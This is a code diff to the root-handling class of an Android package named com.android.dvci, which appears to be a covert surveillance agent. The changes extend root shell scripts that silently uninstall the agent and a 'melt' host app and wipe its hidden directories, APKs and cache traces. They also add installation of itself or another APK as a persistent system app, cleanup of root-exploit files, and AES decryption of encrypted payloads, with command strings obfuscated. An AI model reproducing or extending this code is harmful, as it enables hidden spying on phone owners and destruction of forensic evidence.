@@ -8,6 +8,7 @@ import android.os.Build;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
+import com.android.dvci.crypto.EncryptionPKCS5;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.Markup;
@@ -397,9 +398,49 @@ public class Root {
 			}
 
 			script += Configuration.shellFile + M.e(" blw") + "\n";
+			script += M.e("echo delete ")+ packageName + "\n";
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
+
+			String meltapk = "";
+
+			Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+			if(markupMelt.isMarkup()){
+				meltapk = markupMelt.unserialize(new String());
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (uninstallRoot), uninstall markupMelt: " + meltapk);
+				}
+			}
+
+			if(StringUtils.isEmpty(meltapk)) {
+				AutoFile markupFileMelt = new AutoFile(String.format("/data/data/%s/mm", packageName));
+				if (markupFileMelt.exists()) {
+					byte[] content = markupFileMelt.read();
+					if (content != null) {
+						meltapk = new String(content);
+					}
+					markupFileMelt.delete();
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (uninstallRoot), uninstall markupFileMelt: " + meltapk);
+					}
+				}
+			}
+
+			if(meltapk.length() > 0){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (uninstallRoot), uninstall melt: " + meltapk);
+					Status.self().makeToast("uninstall melt: " + meltapk);
+
+				}
+				script += M.e("echo delete ")+ meltapk + "\n";
+				script += M.e("pm clear ") + meltapk + "\n";
+				script += M.e("pm disable ") + meltapk + "\n";
+				script += M.e("pm uninstall ") + meltapk + "\n";
+			}
+
+
 			if (android.os.Build.VERSION.SDK_INT > 20 && ( Status.isPersistent() || Status.persistencyReady()) ){
 				/* I got one case where bd was partially uninstalled on android5 and manually issued a pm enable to re install, just keep the code here as remainder
 				 * Note: tipical behaviour of disable app, is that when you try to install it again, its icon doesn't appear inside the app dock, and its' impossible
@@ -420,24 +461,27 @@ public class Root {
 			if(!Status.isPersistent()){
 				script += M.e("sleep 5\n");
 			}
+			script += M.e("echo delete sdcard")+ "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/1")) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/2")) + "\n";
-			//if(Status.isPersistent()){
-				script += String.format(M.e("rm -r %s 2>/dev/null"), Status.getAppDir()) + "\n";
-				script += String.format(M.e("rm -r %s 2>/dev/null"), Path.hidden()) + "\n";
-				// TODO: mettere Status.persistencyApk e packageName
-				script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
-			//}
+
+			script += M.e("echo delete appdir")+ "\n";
+			script += String.format(M.e("rm -r %s 2>/dev/null"), Status.getAppDir()) + "\n";
+			script += String.format(M.e("rm -r %s 2>/dev/null"), Path.hidden()) + "\n";
+			// TODO: mettere Status.persistencyApk e packageName
+
+			script += M.e("echo delete app")+ "\n";
+			script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
+
 			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
 			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do rm  $i; done") + "\n";
 			script += M.e("for i in `ls /system/app/*StkDevice* 2>/dev/null`; do rm  $i 2>/dev/null; done") + "\n";
 
+			script += M.e("echo remount ro")+ "\n";
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += M.e("sleep 1; ") + String.format(M.e("rm %s 2>/dev/null"), apkPath) + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
-
-
 
 			ArrayList<String> fl = markup.unserialize(new ArrayList<String>());
 			if (!fl.isEmpty()) {
@@ -458,7 +502,7 @@ public class Root {
 					script += M.e("pm enable ") + app + "\n";
 				}
 			}
-			Core.serivceUnregister();
+			Core.serviceUnregister();
 			boolean ret = Execute.executeRootAndForgetScript(script);
 			if(!ret){
 				Execute.executeScript(script);
@@ -479,20 +523,36 @@ public class Root {
 		return false;
 	}
 
-
-	static synchronized boolean installPersistence(Boolean forceInstall) {
+	/**
+	 * Install apk persistent. If apk is null, it copy itself
+	 * @param forceInstall
+	 * @param apk
+	 * @return
+	 */
+	static synchronized boolean installPersistence(Boolean forceInstall, String apk) {
 		android.content.pm.PackageInfo pi = null;
-		String apkPosition = null;
 		Boolean isPersistent = false;
 
-		if ((apkPosition = Status.getApkName()) != null && !Status.isMelt()) {
+		String apkPosition = Status.getApkName();
+		if(apk == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
+				Check.log(TAG + " (installPersistence), install myself");
 			}
-			isPersistent = Status.isPersistent();
-		} else {
-			return false;
+			if (apkPosition != null && !Status.isMelt()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
+				}
+			} else {
+				return false;
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence), install apk: " + apk);
+			}
+			apkPosition = apk;
 		}
+
+		isPersistent = Status.isPersistent();
 
 		if (isPersistent || Status.persistencyReady()) {
 			if (Cfg.DEBUG) {
@@ -517,7 +577,11 @@ public class Root {
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
 		addOldFileMarkup(String.format(M.e("%s*"), apkPosition.split("-")[0]));
 
-		String packageName = Status.self().getAppContext().getPackageName();
+		String packageName = M.e("com.android.dvci");
+
+		if (apk==null) {
+			packageName = Status.self().getAppContext().getPackageName();
+		}
 
 		String perPkg = Status.persistencyApk;
 		String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
@@ -528,7 +592,6 @@ public class Root {
 		command += M.e("chmod 644 ") + perPkg + "\n";
 		command += String.format(M.e("pm install -r -f %s 2>/dev/null"), perPkg) + "\n";
 		command += M.e("sleep 1") + "\n";
-
 		command += M.e("installed=$(pm list packages ") + packageName + ")\n";
 		//command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
 		command += M.e("am startservice ") + packageName + M.e("/.ServiceMain") + "\n";
@@ -546,7 +609,7 @@ public class Root {
 		String persString = pers.getStdout();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (installPersistence) inst: " + ret.getStdout());
-			Check.log(TAG + " (installPersistence) ls: " + pers.getStdout());
+			Check.log(TAG + " (installPersistence) ls: " + persString);
 		}
 
 		if (Status.persistencyReady()) {
@@ -675,10 +738,6 @@ public class Root {
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 			}
 
-			shellInstaller.delete();
-			selinuxSuidext.delete();
-
-
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -690,6 +749,9 @@ public class Root {
 			}
 
 			return;
+		} finally {
+			shellInstaller.delete();
+			selinuxSuidext.delete();
 		}
 
 	}
@@ -929,7 +991,7 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installPersistence): actual install PERSISTENCE");
 				}
-				Root.installPersistence(false);
+				Root.installPersistence(false, null);
 				Status.self().setReload();
 			}else{
 				if (Cfg.DEBUG) {
@@ -1015,7 +1077,7 @@ public class Root {
 			fos.write(script.getBytes());
 			fos.close();
 			if (absolutPaht != null) {
-				absolutPaht = absP;
+				absP = absolutPaht;
 			}
 			Execute.execute("chmod 755 " + absP);
 
@@ -1146,6 +1208,36 @@ public class Root {
 			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
 
 		SecretKey key = MessagesDecrypt.produceKey(passphrase);
+
+		if (Cfg.DEBUG) {
+			Check.asserts(key != null, "null key"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
+			Check.log(TAG + " (decodeEnc): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
+		}
+
+		// 17.4=AES/CBC/PKCS5Padding
+		Cipher cipher = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding")); //$NON-NLS-1$
+		final byte[] iv = new byte[16];
+		Arrays.fill(iv, (byte) 0);
+		IvParameterSpec ivSpec = new IvParameterSpec(iv);
+
+		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+		CipherInputStream cis = new CipherInputStream(stream, cipher);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
+		}
+
+		return cis;
+	}
+
+	static public InputStream decodeEncSimple(InputStream stream) throws IOException,
+			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
+
+		SecretKey key = MessagesDecrypt.produceKeySimple();
 
 		if (Cfg.DEBUG) {
 			Check.asserts(key != null, "null key"); //$NON-NLS-1$
